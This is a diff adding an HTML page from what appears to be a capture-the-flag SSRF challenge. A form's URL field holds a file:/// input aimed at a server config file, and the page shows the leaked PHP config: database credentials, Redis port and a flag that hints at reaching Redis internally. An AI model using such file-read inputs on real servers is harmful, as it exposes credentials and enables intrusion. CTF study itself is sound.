@@ -1,0 +1,17 @@
+
+
+    <div class="container">
+
+      <pre><code>&lt;&quest;php&NewLine;&NewLine;&sol;&sol; database config&NewLine;define&lpar;&apos;DB&lowbar;USER&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;PASS&apos;&comma; &apos;xssrfmeplz&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;HOST&apos;&comma; &apos;host&equals;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;DB&lowbar;NAME&apos;&comma; &apos;xssrf&apos;&rpar;&semi;&NewLine;&NewLine;&sol;&sol; redis config&NewLine;define&lpar;&apos;REDIS&lowbar;HOST&apos;&comma; &apos;localhost&apos;&rpar;&semi;&NewLine;define&lpar;&apos;REDIS&lowbar;PORT&apos;&comma; 25566&rpar;&semi;&NewLine;&NewLine;&sol;&sol; define flag&NewLine;define&lpar;&apos;FLAG&apos;&comma; &apos;FLAG&lbrace;curl -v -o flag --next flag&colon;&sol;&sol;in-the&period;redis&sol;the&quest;port&equals;25566&amp;good&equals;luck&rcub;&apos;&rpar;&semi;&NewLine;&NewLine;&dollar;c&lowbar;hardness &equals; 5&semi; &sol;&sol; how many proof of work leading zeros&NewLine;</code></pre>
+
+      <form action="/request.php" method="POST">
+        <div class="form-group">
+          <label for="url">URL</label>
+          <textarea name="url" class="form-control" id="url" aria-describedby="url" placeholder="URL" rows="10">file:///var/www/html/config.php</textarea>
+        </div>
+
+        <button class="btn btn-primary">Send Request</button>
+      </form>
+    </div>
+  </body>
+</html>
